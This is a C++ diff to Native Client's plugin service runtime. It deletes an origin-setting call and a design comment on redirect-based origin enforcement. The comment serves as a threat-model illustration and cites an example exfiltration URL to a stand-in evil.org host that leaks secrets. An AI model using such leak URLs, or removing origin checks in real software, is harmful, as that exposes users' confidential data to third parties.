@@ -96,54 +96,6 @@ bool ServiceRuntime::InitCommunication(nacl::Handle bootstrap_socket,
     return false;
   }
 
-  // Set module's origin at the service runtime.  NB: we may end up
-  // enforcing restrictions for network access to the origin of the
-  // module only in the plugin.  Here's why:
-  //
-  // When a plugin using NPAPI invokes NPP_GetURLNotify (on the behalf
-  // of a NaCl module), it may provide a relative URL; even if it is
-  // not a relative URL, 3xx redirects may change the source domain of
-  // the actual web content as a side effect -- the 3xx redirects
-  // cause the browser to make new HTTP connections, and the browser
-  // does not notify the plugin as this is occurring.  However, when
-  // the browser invokes NPN_NewStream and then either
-  // NPN_StreamAsFile or NPP_WriteReady/NPP_Write to deliver the
-  // content, the NPStream object contains the fully-qualified URL of
-  // the web content, after redirections (if any).  This means that we
-  // should parse the FQ-URL at NPN_NewStream or NPN_StreamAsFile,
-  // rather than try to canonicalize the URL before passing it to
-  // NPP_GetURLNotify, since we won't know the final FQ-URL at that
-  // point.
-  //
-  // This strategy also implies that we might allow any URL, e.g., a
-  // tinyurl.com redirecting URL, to be used with NPP_GetURLNotify,
-  // and allow the access if the final FQ-URL is the same domain.
-  // This has the hazard that we still are doing fetches to other
-  // domains (including sending cookies specific to those domains),
-  // just not making the results available to the NaCl module; the
-  // same thing occurs if IMG SRC tags were scripted.
-  //
-  // A perhaps more important downside is that this is an easy way for
-  // NaCl modules to leak information: the target web server is always
-  // contacted, since we don't know if
-  // http://evil.org/leak?s3kr1t_inf0 might result in a 3xx redirect
-  // to an acceptable origin.  If we want to prevent this, we could
-  // require that all URLs given to NPP_GetURLNotify are either
-  // relative or are absolute with the same origin as the module; this
-  // would prevent the scenario where an evil module is hosted (e.g.,
-  // in temporary upload directory that's visible, or as a gmail
-  // attachment URL) at an innocent server to extract confidential
-  // info and send it to third party servers.  An explict network ACL
-  // a la /robots.txt might be useful to serve as an ingress filter.z
-
-  PLUGIN_PRINTF(("ServiceRuntime::InitCommuncation (invoking set_origin)\n"));
-  if (!runtime_channel_->SetOrigin(plugin_->nacl_module_origin())) {
-    const char* error = "could not set origin";
-    PLUGIN_PRINTF(("ServiceRuntime::InitCommunication (%s)\n", error));
-    browser_interface_->Alert(plugin()->instance_id(), error);
-    return false;
-  }
-
   if (shm != NULL) {
     // This code is executed only if NaCl is running as a built-in plugin
     // in Chrome.
